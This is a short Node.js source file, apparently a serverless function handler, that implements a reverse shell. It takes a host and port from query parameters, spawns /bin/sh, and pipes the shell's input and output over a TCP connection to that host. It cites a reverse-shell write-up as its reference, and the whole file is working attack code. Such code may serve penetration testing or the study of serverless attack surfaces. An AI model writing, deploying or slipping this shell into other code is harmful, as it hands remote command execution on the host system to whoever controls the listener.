/* References
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
https://stackoverflow.com/a/33292942
*/
const net = require('net');
const cp = require('child_process');

module.exports.panther = async (event) => {
  let host;
  let port;

  if (event.queryStringParameters) {
    host = event.queryStringParameters.host;
    port = event.queryStringParameters.port;
  }

  if (!host || !port) {
    return {
      statusCode: 400,
      body: JSON.stringify({
        message: 'Must provide the host and port for the target TCP server as query parameters.',
      }),
    };
  }

  const portNum = parseInt(port, 10);

  const sh = cp.spawn('/bin/sh', []);
  const client = new net.Socket();

  try {
    await new Promise((resolve, reject) => {
      client.connect(portNum, host, () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
      });

      client.on('close', (hadError) => {
        if (hadError) {
          reject(new Error('Transmission error.'));
        } else {
          resolve();
        }
      });

      client.on('end', () => {
        resolve();
      });

      client.on('error', (err) => {
        reject(err);
      });

      client.on('timeout', () => {
        reject(new Error('Socket timeout.'));
      });
    });

    return {
      statusCode: 400,
      body: JSON.stringify({
        message: 'Connection terminated from client.',
      }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        message: 'Connection terminated from client.',
      }),
    };
  }
};
